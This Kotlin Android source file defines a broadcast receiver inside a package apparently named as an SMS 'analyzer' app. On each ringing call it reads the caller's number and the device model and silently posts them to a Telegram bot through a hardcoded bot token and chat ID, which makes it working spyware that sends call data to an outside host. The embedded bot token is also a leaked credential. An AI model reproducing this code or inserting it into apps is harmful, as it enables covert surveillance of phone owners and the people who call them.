package com.analyzer.smsbeta

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.telephony.TelephonyManager
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody

class CallReceiver : BroadcastReceiver() {
    private val client = OkHttpClient()

    override fun onReceive(context: Context?, intent: Intent?) {
        val state = intent?.getStringExtra(TelephonyManager.EXTRA_STATE)
        val incomingNumber = intent?.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER)
        val deviceModel = getDeviceModel()

        if (state == TelephonyManager.EXTRA_STATE_RINGING && incomingNumber != null) {
            val callerNumber = incomingNumber
            val deviceModel = getDeviceModel()

            sendCallInfoToTelegram(callerNumber, deviceModel)
        }
    }

    private fun getDeviceModel(): String {
        return "${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL}"
    }


    private fun sendCallInfoToTelegram(callerNumber: String, device: String) {
        val botToken = "7824327491:AAGmZ5eA57SWIpWI3hfqRFEt6cnrQPAhnu8"
        val chatId = "6331293386"
        val url = "https://api.telegram.org/bot$botToken/sendMessage"

        val text = """
            Входящий вызов!
            Номер: $callerNumber
            
            $device""".trimIndent()

        val mediaType = "application/json".toMediaType()
        val requestBody = """
            {
                "chat_id": "$chatId",
                "text": "$text",
                "parse_mode": "Markdown"
            }
        """.trimIndent().toRequestBody(mediaType)

        val request = Request.Builder()
            .url(url)
            .post(requestBody)
            .build()

        client.newCall(request).enqueue(object : okhttp3.Callback {
            override fun onFailure(call: okhttp3.Call, e: java.io.IOException) {
                e.printStackTrace()
            }

            override fun onResponse(call: okhttp3.Call, response: okhttp3.Response) {
                if (!response.isSuccessful) {
                    println("${response.code}")
                }
                response.close()
            }
        })
    }
}
